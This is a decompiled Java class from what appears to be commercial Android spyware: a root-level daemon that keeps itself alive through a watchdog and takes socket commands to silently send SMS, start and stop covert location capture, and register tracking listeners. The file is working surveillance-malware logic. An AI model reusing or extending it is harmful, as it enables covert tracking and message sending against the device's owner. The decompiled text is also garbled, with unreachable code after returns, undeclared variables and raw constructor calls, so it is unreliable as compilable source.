package com.fx.psysd;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Looper;
import android.telephony.SmsManager;

import com.fx.daemon.util.MyUncaughtExceptionHandler;
import com.fx.daemon.util.WatchingProcess;
import com.fx.pmond.ref.command.RemoteAddProcess;
import com.fx.psysd.ref.command.RemoteSendSms;
import com.fx.psysd.ref.command.SendSmsMetadata;
import com.fx.socket.SocketCmd;
import com.fx.socket.command.RemoteCheckAlive;
import com.fx.socket.command.RemoteCheckSync;
import com.fx.socket.command.RemoteSetSync;
import com.fx.socket.command.RemoteSetSync.SyncData;
import com.fx.socket.command.RemoteShutdownRequest;
import com.vvt.base.FxEvent;
import com.vvt.capture.location.CallingModule;
import com.vvt.capture.location.f;
import com.vvt.capture.location.ref.command.RemoteLocationEvent;
import com.vvt.capture.location.ref.command.RemoteLocationMetadata;
import com.vvt.capture.location.ref.command.RemoteRegisterListener;
import com.vvt.capture.location.ref.command.RemoteSetTimeIntervalMs;
import com.vvt.capture.location.ref.command.RemoteStartCapture;
import com.vvt.capture.location.ref.command.RemoteStopCapture;
import com.vvt.capture.location.ref.command.RemoteUnregisterListener;
import com.vvt.shell.ShellUtil;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentHashMap;

public class SystemDaemomMain implements com.fx.socket.a {
    private boolean a;
    private boolean b;
    private boolean c;
    private Context d;
    private Looper e;
    private com.fx.socket.b f;
    private f g;
    private ConcurrentHashMap h;
    private Callable i;

    public SystemDaemomMain() {
        this.a = com.vvt.ak.a.a;
        this.b = com.vvt.ak.a.b;
        this.c = com.vvt.ak.a.e;
        this.i = new com.fx.psysd.a(this);
    }

    private void a() {
        boolean bool1 = this.b;
        if (bool1) {}
        bool1 = this.b;
        if (bool1) {}
        UncaughtExceptionHandler exceptionHandler = new MyUncaughtExceptionHandler("SystemDaemomMain", com.vvt.m.b.c, this.i);;
        Thread.setDefaultUncaughtExceptionHandler(exceptionHandler);
        bool1 = this.b;
        if (bool1) {}
        com.vvt.s.a.a();

        boolean bool2 = ShellUtil.a("psysd");
        if (bool2) {
            bool1 = this.c;
            if (bool1) {}
            ShellUtil.a();
        }

        for (;;) {
            return;
            com.fx.daemon.b.b((String)localObject1);
            bool1 = this.b;
            if (bool1) {}
            com.fx.daemon.b.a("SystemDaemomMain");
            bool1 = this.b;
            if (bool1) {}
            Looper.prepare();
            this.e = Looper.myLooper();
            bool1 = this.b;
            if (bool1) {}
            this.d = com.fx.daemon.b.b();
            if (this.d == null) {
                bool1 = this.c;
                if (bool1) {}
                ShellUtil.a();
            } else {
                bool1 = this.b;
                if (bool1) {}
                bool1 = c();
                if (!bool1)
                {
                    bool1 = this.c;
                    if (bool1) {}
                    ShellUtil.a();
                } else {
                    bool1 = this.b;
                    if (bool1) {}
                    localObject1 = new com/vvt/capture/location/f;
                    localObject2 = this.d;
                    str = com.vvt.m.b.c;
                    ((f)localObject1).<init>((Context)localObject2, str);
                    this.g = ((f)localObject1);
                    localObject1 = new java/util/concurrent/ConcurrentHashMap;
                    ((ConcurrentHashMap)localObject1).<init>();
                    this.h = ((ConcurrentHashMap)localObject1);
                    f();
                    bool1 = this.b;
                    if (bool1) {}
                    b();
                    bool1 = this.b;
                    if (bool1) {}
                    Looper.loop();
                    bool1 = this.a;
                    if (!bool1) {}
                }
            }
        }
    }

    private void a(FxEvent paramFxEvent, int paramInt) {
        boolean bool = this.a;
        if (bool) {}
        RemoteLocationMetadata localRemoteLocationMetadata = new com.vvt.capture.location.ref.command.RemoteLocationMetadata();
        localRemoteLocationMetadata.setCallingModule(paramInt);
        localRemoteLocationMetadata.setEvent(paramFxEvent);
        RemoteLocationEvent remoteLocationEvent = new com.vvt.capture.location.ref.command.RemoteLocationEvent(localRemoteLocationMetadata);
        try {
            remoteLocationEvent.execute();
        } catch (Exception e) {
        }
    }

    private void a(String paramString1, String paramString2) {
        bool1 = this.a;
        if (bool1) {}
        for (;;) {
            try {
                localSmsManager = SmsManager.getDefault();
                localObject2 = localSmsManager.divideMessage(paramString1);
                boolean bool2 = this.a;
                if (bool2) {}
                int j = ((ArrayList)localObject2).size();
                k = 1;
                if (j <= k) {
                    continue;
                }
                k = 0;
                localSmsManager.sendMultipartTextMessage(paramString2, null, (ArrayList)localObject2, null, null);
            } finally {
                SmsManager localSmsManager;
                Object localObject2;
                int k;
                bool1 = this.c;
                if (!bool1) {
                    continue;
                }
                continue;
            }
            bool1 = this.a;
            if (bool1) {}
            return;
            k = 0;
            localObject2 = paramString1;
            localSmsManager.sendTextMessage(paramString2, null, paramString1, null, null);
        }
    }

    private boolean a(int paramInt) {
        boolean bool = this.a;
        if (bool) {}
        bool = this.a;
        if (bool) {}
        Object localObject1 = CallingModule.forValue(paramInt);
        Object localObject2 = this.h;
        int j = ((CallingModule)localObject1).getNumber();
        Object localObject3 = Integer.valueOf(j);
        bool = ((ConcurrentHashMap)localObject2).containsKey(localObject3);
        if (bool) {
            localObject2 = this.h;
            j = ((CallingModule)localObject1).getNumber();
            localObject3 = Integer.valueOf(j);
            localObject2 = (HashSet)((ConcurrentHashMap)localObject2).get(localObject3);
            localObject3 = ((HashSet)localObject2).iterator();
            for (;;) {
                bool = ((Iterator)localObject3).hasNext();
                if (!bool) {
                    break;
                }
                localObject2 = (com.vvt.base.a)((Iterator)localObject3).next();
                f localf = this.g;
                localf.b((CallingModule)localObject1, (com.vvt.base.a)localObject2);
                bool = this.a;
                if (!bool) {}
            }
            localObject2 = this.h;
            int k = ((CallingModule)localObject1).getNumber();
            localObject1 = Integer.valueOf(k);
            ((ConcurrentHashMap)localObject2).remove(localObject1);
        }
        e();
        bool = this.a;
        if (bool) {}
        return true;
    }

    private boolean a(int paramInt, com.vvt.base.a parama)
    {
        boolean bool1 = this.a;
        if (bool1) {}
        Object localObject1 = CallingModule.forValue(paramInt);
        boolean bool3 = this.a;
        if (bool3) {}
        bool3 = this.a;
        if (bool3) {}
        this.g.a((CallingModule)localObject1, parama);
        Object localObject2 = this.h;
        int m = ((CallingModule)localObject1).getNumber();
        Object localObject3 = Integer.valueOf(m);
        bool3 = ((ConcurrentHashMap)localObject2).containsKey(localObject3);
        if (bool3) {
            localObject2 = this.h;
            int j = ((CallingModule)localObject1).getNumber();
            localObject1 = Integer.valueOf(j);
            localObject1 = (HashSet)((ConcurrentHashMap)localObject2).get(localObject1);
            ((HashSet)localObject1).add(parama);
        }

        for (;;) {
            e();
            boolean bool2 = this.a;
            if (bool2) {}
            return true;
            localObject2 = new java/util/HashSet;
            ((HashSet)localObject2).<init>();
            ((HashSet)localObject2).add(parama);
            localObject3 = this.h;
            int k = ((CallingModule)localObject1).getNumber();
            localObject1 = Integer.valueOf(k);
            ((ConcurrentHashMap)localObject3).put(localObject1, localObject2);
        }
    }

    private boolean a(long paramLong) {
        this.g.a(paramLong);
        return true;
    }

    private void b() {
        ContentResolver localContentResolver = this.d.getContentResolver();
        Uri localUri = com.fx.psysd.ref.a.f;
        localContentResolver.notifyChange(localUri, null);
    }

    private boolean b(int paramInt) {
        CallingModule localCallingModule = CallingModule.forValue(paramInt);
        this.g.a(localCallingModule);
        return true;
    }

    private boolean c() {
        boolean bool1 = this.a;
        if (bool1) {}
        bool1 = false;
        try {
            this.f = new com.fx.socket.b("SystemDaemomMain", "com.fx.socket.psysd", this);
            localb = this.f;
            localb.start();
            bool1 = true;
        } catch (Exception e) {
        }
        bool2 = this.a;
        if (bool2) {}
        return bool1;
    }

    private boolean c(int paramInt) {
        CallingModule localCallingModule = CallingModule.forValue(paramInt);
        this.g.b(localCallingModule);
        return true;
    }

    private com.vvt.base.a d(int paramInt) {
        c localc = new com.fx.psysd.c(this, paramInt);
        return localc;
    }

    private void d() {
        Object localObject = this.f;
        boolean bool;
        if (localObject != null) {
            bool = this.a;
            if (bool) {}
            this.f.a();
        }

        for (;;) {
            bool = this.b;
            if (bool) {}
            ShellUtil.a();
            return;
            localObject = this.e;
            if (localObject != null) {
                bool = this.a;
                if (bool) {}
                this.e.quit();
            }
        }
    }

    private void e() {
        boolean bool = this.a;
        if (bool) {}
        Iterator localIterator = this.h.keySet().iterator();
        for (;;) {
            bool = localIterator.hasNext();
            if (!bool) {
                break;
            }
            localObject = (Integer)localIterator.next();
            localObject = this.h.get(localObject);
            bool = this.a;
            if (!bool) {}
        }
    }

    private void f() {
        RemoteCheckSync remoteCheckSync = new com.fx.socket.command.RemoteCheckSync("com.fx.socket.pmond", "com.fx.psysd");
        try {
            localObject1 = remoteCheckSync.execute();
            localObject1 = (Boolean)localObject1;
            bool1 = ((Boolean)localObject1).booleanValue();
            boolean bool2 = this.a;
            if ((!bool2) || (!bool1)) {
                bool1 = this.b;
                if (bool1) {}
                g();
                localObject1 = new com/fx/socket/command/RemoteSetSync$SyncData;
                ((RemoteSetSync.SyncData)localObject1).<init>();
                localObject2 = "com.fx.psysd";
                ((RemoteSetSync.SyncData)localObject1).setClientPackage((String)localObject2);
                bool2 = true;
                ((RemoteSetSync.SyncData)localObject1).setSync(bool2);
                localObject2 = new com/fx/socket/command/RemoteSetSync;
                str = "com.fx.socket.pmond";
                ((RemoteSetSync)localObject2).<init>(str, (RemoteSetSync.SyncData)localObject1);
                ((RemoteSetSync)localObject2).execute();
                bool1 = this.b;
                if (!bool1) {}
            }
            return;
        }
        catch (IOException localIOException)
        {
            for (;;)
            {
                boolean bool1 = this.c;
                if (!bool1) {}
            }
        }
    }

    private void g()
    {
        WatchingProcess localWatchingProcess = new com/fx/daemon/util/WatchingProcess;
        localWatchingProcess.<init>();
        localWatchingProcess.setProcessName("psysd");
        Object localObject = new java/lang/StringBuilder;
        ((StringBuilder)localObject).<init>();
        String str = com.fx.psysd.ref.a.e;
        localObject = str;
        localWatchingProcess.setStartupScriptPath((String)localObject);
        localWatchingProcess.setServerName("com.fx.socket.psysd");
        boolean bool1 = true;
        localWatchingProcess.setExecuteAsSystem(bool1);
        localObject = new com/fx/pmond/ref/command/RemoteAddProcess;
        ((RemoteAddProcess)localObject).<init>(localWatchingProcess);
        try
        {
            ((RemoteAddProcess)localObject).execute();
            return;
        }
        catch (IOException localIOException)
        {
            for (;;)
            {
                boolean bool2 = this.c;
                if (!bool2) {}
            }
        }
    }

    public static void main(String[] args) {
        com.fx.daemon.b.a("SystemDaemomMain", com.fx.psysd.ref.a.d, "fx.log");
        SystemDaemomMain localSystemDaemomMain = new com.fx.psysd.SystemDaemomMain();
        localSystemDaemomMain.a();
    }

    public Object a(SocketCmd paramSocketCmd) {
        boolean bool1 = true;
        boolean bool2 = false;
        Object localObject1 = null;
        boolean bool7 = paramSocketCmd instanceof RemoteCheckAlive;
        if (bool7) {
            bool2 = this.a;
            if (bool2) {}
            localObject1 = Boolean.valueOf(bool1);
        }

        for (;;) {
            return localObject1;
            bool7 = paramSocketCmd instanceof RemoteSendSms;
            Object localObject2;
            if (bool7) {
                bool2 = this.a;
                if (bool2) {}
                paramSocketCmd = (RemoteSendSms)paramSocketCmd;
                localObject1 = (SendSmsMetadata)paramSocketCmd.getData();
                localObject2 = ((SendSmsMetadata)localObject1).getMessage();
                localObject1 = ((SendSmsMetadata)localObject1).getRecipientNumber();
                a((String)localObject2, (String)localObject1);
                localObject1 = Boolean.valueOf(bool1);
            } else {
                bool7 = paramSocketCmd instanceof RemoteRegisterListener;
                boolean bool3;
                if (bool7) {
                    bool2 = this.a;
                    if (bool2) {}
                    paramSocketCmd = (RemoteRegisterListener)paramSocketCmd;
                    int j = ((Integer)paramSocketCmd.getData()).intValue();
                    localObject2 = d(j);
                    bool3 = a(j, (com.vvt.base.a)localObject2);
                    localObject1 = Boolean.valueOf(bool3);
                } else {
                    bool7 = paramSocketCmd instanceof RemoteUnregisterListener;
                    boolean bool4;
                    if (bool7) {
                        bool3 = this.a;
                        if (bool3) {}
                        paramSocketCmd = (RemoteUnregisterListener)paramSocketCmd;
                        int k = ((Integer)paramSocketCmd.getData()).intValue();
                        bool4 = a(k);
                        localObject1 = Boolean.valueOf(bool4);
                    } else {
                        bool7 = paramSocketCmd instanceof RemoteStartCapture;
                        boolean bool5;
                        if (bool7) {
                            bool4 = this.a;
                            if (bool4) {}
                            paramSocketCmd = (RemoteStartCapture)paramSocketCmd;
                            int m = ((Integer)paramSocketCmd.getData()).intValue();
                            bool5 = b(m);
                            localObject1 = Boolean.valueOf(bool5);
                        } else {
                            bool7 = paramSocketCmd instanceof RemoteStopCapture;
                            boolean bool6;
                            if (bool7) {
                                bool5 = this.a;
                                if (bool5) {}
                                paramSocketCmd = (RemoteStopCapture)paramSocketCmd;
                                int n = ((Integer)paramSocketCmd.getData()).intValue();
                                bool6 = c(n);
                                localObject1 = Boolean.valueOf(bool6);
                            } else {
                                if (paramSocketCmd instanceof RemoteSetTimeIntervalMs) {
                                    if (this.a) {}
                                    paramSocketCmd = (RemoteSetTimeIntervalMs)paramSocketCmd;
                                    long l = ((Long)paramSocketCmd.getData()).longValue();
                                    bool6 = a(l);
                                    localObject1 = Boolean.valueOf(bool6);
                                } else {
                                    bool7 = paramSocketCmd instanceof RemoteShutdownRequest;
                                    if (bool7) {
                                        bool6 = this.a;
                                        if (bool6) {}
                                        localObject2 = new com.fx.psysd.b(this);
                                        Thread thread = new java.lang.Thread(localObject2);
                                        thread.start();
                                        localObject1 = Boolean.valueOf(bool1);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/psysd/SystemDaemomMain.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */